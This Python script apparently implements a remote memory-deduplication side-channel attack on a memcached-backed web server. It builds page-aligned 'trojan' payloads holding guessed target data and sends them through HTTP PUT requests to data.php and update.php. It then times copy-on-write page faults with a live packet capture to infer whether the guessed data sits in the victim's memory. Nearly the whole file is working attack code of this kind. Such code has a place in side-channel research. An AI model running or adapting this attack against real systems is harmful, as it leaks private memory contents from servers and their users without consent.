import mmap
from pprint import pprint
import rdtsc
import click
import binascii
import numpy as np
import pandas as pd
import pyshark
import threading
import sys
import signal
import random
import matplotlib
import re
import time
import pprint
import requests
from datetime import datetime
import pdb
matplotlib.use('Agg')
from addict import Dict

from tqdm import trange


import subprocess
from tqdm import tqdm
import os
import math
import asyncio

TROJAN_NAME_TEMPLATE = "tjn{:03}"
STEP = (2*1024*1024)
SLEEP_TIME = 4000000
SLEEP_TIME = 10000000
#SLEEP_TIME = 1000000

ground_truth = []
#mmap.mmap(-1, 4096, flags=mmap.MAP_PRIVATE, prot=mmap.PROT_READ|mmap.PROT_WRITE)
page_content = None

usleep = lambda x: time.sleep(x/1000000.0)

#pd.set_option('display.max_rows', 50)
#pd.set_option('display.min_rows', None)

measurements = [] 
measurements_offsets = {}
measurements_offsets_h2time = {}
number_of_measurements = 0
capture_thread = None
is_single_mode = False
is_http1 = False

class MemcachedTrojanBuilder:
    # memcached uses 1MB pages
    PAGE_SIZE = 1 * 1024 * 1024
    # usable chunk sizes
    CHUNK_SIZES = [52984, 66232, 82792, 103496, 129376, 161720, 202152, 252696, 315872, 394840, 524288]

    def __init__(self, target_key_size, target_data):
        # + 1 == c string terminator
        self.target_key_size_ = target_key_size + 1 
        # align to page size
        self.target_data_ = target_data + b"\x00" * (-len(target_data) % mmap.PAGESIZE)
        self.target_size_ = len(target_data)
        # get possible offsets 
        self.page_chunk_offsets_ = self.getPageChunkOffsets()

    def getPageChunkOffsets(self):
        result = {}
        for chunk_size in MemcachedTrojanBuilder.CHUNK_SIZES:
            chunks_per_page = int(MemcachedTrojanBuilder.PAGE_SIZE / chunk_size)
            offset_set = {}
            for i in range(chunks_per_page):
                # (malloc (mmap) offset + chunk offset + size item header + key name size) mod PAGESIZE
                offset = int(0x10 + i * chunk_size + 0x38 + self.target_key_size_) % mmap.PAGESIZE
                if offset not in offset_set:
                    offset_set[offset] =  True
            result[chunk_size] = sorted(offset_set.keys())
        return result

    def findFittingChunk(self):
        for i in range(len(MemcachedTrojanBuilder.CHUNK_SIZES)):
            chunk_size = MemcachedTrojanBuilder.CHUNK_SIZES[i]
            # additional page for all possible alignments 
            needed_space = 0x38 + self.target_key_size_ + self.target_size_ * len(self.page_chunk_offsets_[chunk_size]) + mmap.PAGESIZE
            if chunk_size >= needed_space:
                return chunk_size, i
        return None

    def build(self, fill_byte):
        chunk_size, chunk_size_i = self.findFittingChunk() 
        # data too big
        if chunk_size is None:
            return None 
        # generate the trojan data
        trojan_data = bytearray() 
        alignment_accum = 0
        # highest offset to lowest
        for offset in reversed(self.page_chunk_offsets_[chunk_size]):
            # get alignment for current offset (taking in account previous potentially -wrong- alignments)
            current_alignment = mmap.PAGESIZE - offset - alignment_accum
            alignment_accum += current_alignment
            trojan_data +=  fill_byte * current_alignment + self.target_data_
        # needs to be at least bigger as next smaller chunk size
        next_smaller_chunk_size = MemcachedTrojanBuilder.CHUNK_SIZES[chunk_size_i - 1]
        if len(trojan_data) <= next_smaller_chunk_size:
            trojan_data += fill_byte * (next_smaller_chunk_size - len(trojan_data) + 1)
        return trojan_data



class CapturePySharkThread(threading.Thread):
    def __init__(self, group=None, target=None, interface=None,tcp_port=None, name=None, args=(), kwargs={}):
        threading.Thread.__init__(self, group,target,name, args=args, kwargs=kwargs)
        self._capture = pyshark.LiveCapture(interface=interface,
                                            bpf_filter=f'tcp port {tcp_port}',
                                            use_json=False)
        self._return = None
        self._stopping = False

    def run(self):
        global measurements

        #self._stopping = False
        # self._capture.apply_on_packets(self.packet_callback)

        parsing_tracker = {}

        for packet in self._capture.sniff_continuously():
            try:
                if 'http' in packet and packet.http.chat:
                    if 'update' in packet.http.chat and not 'random' in packet.http.chat:
                        parsed_begin = True
                        #print(packet.http.chat)
                        nextseq = packet.tcp.nxtseq
                        current_offset = re.search(r'name=tjn00(\d+)', packet.http.chat).group(1)
                        begin = packet.sniff_timestamp
                        begin = float(begin)

                        parsing_tracker[nextseq] = {
                                'offset': current_offset,
                                'begin': begin
                                }
                        continue

                # find end
                all_fields = vars(packet.tcp)['_all_fields'] # so ugly

                if int(all_fields['tcp.flags.push']) == 1 and int(all_fields['tcp.flags.ack']) == 1:
                    if packet.tcp.ack in parsing_tracker:
                        end = packet.sniff_timestamp
                        end = float(end)
                        if 'tcp.time_relative' in all_fields:
                            time_since_first_frame = int(float(all_fields['tcp.time_relative']) * 1000000000)
                        else:
                            time_since_first_frame = np.NaN

                        if 'tcp.time_delta' in all_fields:
                            time_since_previous_frame = int(float(all_fields['tcp.time_delta']) * 1000000000)
                        else:
                            time_since_previous_frame = np.NaN

                        diff = (end-parsing_tracker[packet.tcp.ack]['begin'])*1000000.
                        m = (
                            parsing_tracker[packet.tcp.ack]['offset'],
                            diff,
                            time_since_first_frame,
                            time_since_previous_frame,
                            )

                        measurements.append(m)#measurements.append(m, ignore_index=True)

                        del parsing_tracker[packet.tcp.ack]

                        # print update
                        #print_update()
                if self._stopping == True:
                    break
            except Exception as e:
                print(e)
                continue

    def stop(self):
        self._stopping = True

def filter_outlier(df, column):
    groups = df.groupby('Offset')
    for group, data in groups:
        data = data.mask(data.sub(data.mean()).div(data.std()).abs().gt(2))

    return df

    groups = df.groupby('Offset')[column]
    groups_mean = groups.transform('mean')
    groups_std = groups.transform('std')
    m = df[column].between(groups_mean.sub(groups_std.mul(3)),
            groups_mean.add(groups_std.mul(3)),
            inclusive=False)

    x = df.loc[m][column]
    print('ehll')
    print(x)
    return df

# def print_update():
#     global number_of_measurements
#     global is_single_mode

#     try:
#         order_by_column = 'Prev TS Frame' #if is_single_mode else 'Count'

#         df = measurements
#         #print(df)
#         #df = df.mask(df.sub(df.mean()).div(df.std()).abs().gt(2))
#         #df = filter_outlier(df, 'Timestamp')

#         df_median = df.groupby('Offset')
#         groups = df_median.groups.keys()
#         df_median = df_median.median()
        
#         df_mean = df.groupby('Offset')
#         groups = df_mean.groups.keys()
#         df_mean = df_mean.mean() #.sort_values('TS First Frame')
        
#         df_median = df_median.sort_values(by=[order_by_column],ascending=False)
#         df_mean = df_mean.sort_values(by=[order_by_column], ascending=False)

#         print("\033c")
#         print(f"Number of measurements: {number_of_measurements}")
#         print("Median")
#         print(df_median.head(n=15))
#         print("Mean")
#         print(df_mean.head(n=15))
#     except Exception as e:
#         print(e)
#         pass

def store_logs():
    measurements_df = pd.DataFrame(data=measurements, columns=['Offset', 'Timestamp','Prev First Frame','Prev TS Frame'])
    measurements_df.to_csv(f'log.csv')

def signal_handler(sig, frame):
    store_logs()

    if capture_thread is not None:
        capture_thread.stop()
    
    sys.exit(0)

def address_to_int(ctx, param, value):
    return int(value[2:], 16)

def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def generate_random_pages(bytes_to_read):
    data = b""
    with open("/dev/urandom", "rb") as file:
        data = file.read(bytes_to_read)
    return data


def put_page(host,port,page,i):
    req_url = f"http://{host}:{port}/data.php?name={i}"
    headers = {"Content-Type": "*/*", "x-sample":"cow"}
    r = requests.put(req_url,headers=headers,data=page)

def update_page(host,port,page,i):
    req_url = f"http://{host}:{port}/update.php?name={i}"
    headers = {"Content-Type": "*/*", "x-sample":"cow"}
    r = requests.put(req_url,headers=headers,data=page)

@click.command()
@click.option('-f', '--page-file','page_files', type=click.Path(exists=True), multiple=True, required=True)
@click.option('-h', '--host', type=str, default='0.0.0.0')
@click.option('-p', '--port', type=int, default=6666)
@click.option('-d', '--device', default="enp3s0")
@click.option('-n', '--tries', type=int, default=1)
@click.option('-m', '--message-size',type=int,default=128)
def main(page_files,host, port, device, tries,message_size):
    global number_of_measurements
    global measurements
    global measurements_offsets
    global measurements_offsets_h2time
    global pages
    global page_offsets
    global kernel_offsets
    global is_http1
    global start_time
    global ground_truth

    bytes_in_parallel = 32
    amplification_factor = 16

    pcap_file = "/tmp/captured.pcap"

    #read in random message
    with open("/dev/urandom", "rb") as file:
        message = file.read(message_size)

    # load attack target data
    targets_data = []
    for f in page_files:
        with open(f, "rb") as file:
            target_data = file.read()
            targets_data.append((f, target_data))
    target_size = len(targets_data[0][1])
    target_pages = math.ceil(len(targets_data[0][1]) / mmap.PAGESIZE)


    library_guesses = []
    for d in range(len(targets_data)):
        # generate attack trojan data
        #trojan_key = TROJAN_NAME_TEMPLATE.format(d)
        trojan_builder = MemcachedTrojanBuilder(len("tjn000"), targets_data[d][1])
        trojan_payload = trojan_builder.build(d.to_bytes(1, "little"))
        library_guesses.append((f"tjn00{d}",trojan_payload))

    signal.signal(signal.SIGINT, signal_handler)
    capture_thread = CapturePySharkThread(interface=device, tcp_port=port)
    capture_thread.start()
    #p = subprocess.Popen([f'/usr/bin/dumpcap -i {device} -y EN10MB -Z none -w /tmp/captured.pcap'],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    
    usleep(10000)

    headers = {"Content-Type": "*/*", "x-sample":"cow"}
    attack_start_ts = time.clock_gettime(time.CLOCK_MONOTONIC) 
    for t in trange(tries):
        #this sets up the put covert pages
         
        #we put the guesses into memcached
        #for i in range(10):
        #    random_pages = generate_random_pages(len(library_guesses[0][1]))
        #    put_page(host,port,random_pages,f"dummy1")
        
        np.random.shuffle(library_guesses)
        for i in range(0,len(library_guesses)):
            random_pages = generate_random_pages(len(library_guesses[i][1]))
            put_page(host,port,random_pages,library_guesses[i][0])
            put_page(host,port,library_guesses[i][1],library_guesses[i][0])

        #wait for the deduplication
        usleep(2000000)
        
        #next put puts on free list
        np.random.shuffle(library_guesses)
        for i in range(0,len(library_guesses)): 
          random_pages = generate_random_pages(len(library_guesses[i][1]))
          put_page(host,port,random_pages,library_guesses[i][0])
          
          #pdb.set_trace()
          random_pages = generate_random_pages(len(library_guesses[i][1]))
          update_page(host,port,random_pages,library_guesses[i][0])
         #now update the page to trigger the cow-pf
        
        number_of_measurements = number_of_measurements + 1
        #print_update()

    #print("Done sending reqs.")
    attack_end_ts = time.clock_gettime(time.CLOCK_MONOTONIC)
    print(attack_end_ts-attack_start_ts,end=";")
    
    #p.kill()
    capture_thread.stop()
    usleep(500000)
    capture_thread.join()
    store_logs()
    #capture_thread = FileCapturePyShark(pcap_file=pcap_file,interface=device, tcp_port=port)
    #capture_thread.run()

if __name__ == "__main__":
    main()
